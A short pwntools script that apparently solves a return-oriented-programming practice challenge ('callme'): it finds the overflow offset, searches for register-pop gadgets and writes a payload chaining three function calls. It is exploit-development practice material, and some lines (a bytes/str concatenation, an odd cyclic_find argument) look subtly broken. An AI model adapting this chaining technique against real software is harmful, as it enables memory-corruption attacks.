#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

open('cyclic.txt', 'w').write(cyclic(0x100, n=8) + '\n')
N = cyclic_find('faaaaaaag', n=8)

e = ELF('callme')
print(e.symbols)

rop = ROP(e)

rdi = rop.search(regs=['rdi'])
rsi = rop.search(regs=['rsi'])
rdx = rop.search(regs=['rdx'])

print(rdi)
print(rsi)
print(rdx)


def setup_args(rop):
    rop.raw(rdi)
    rop.raw(1)
    rop.raw(rsi)
    rop.raw(2)
    rop.raw(2)
    rop.raw(rdx)
    rop.raw(3)

setup_args(rop)
rop.call('callme_one')
setup_args(rop)
rop.call('callme_two')
setup_args(rop)
rop.call('callme_three')
print(rop.dump())

open('input.txt', 'wb').write(b'A' * N + rop.chain() + b'\n')
